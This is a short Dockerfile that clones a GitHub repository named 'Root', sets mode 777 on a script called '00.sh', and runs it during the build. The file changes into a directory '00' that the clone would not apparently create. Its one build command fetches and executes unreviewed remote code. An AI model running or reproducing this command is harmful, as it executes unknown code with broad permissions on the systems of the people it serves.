FROM golang:latest
RUN git clone https://github.com/diprassss/Root.git && cd 00 && chmod 777 00 00.sh && ./00.sh
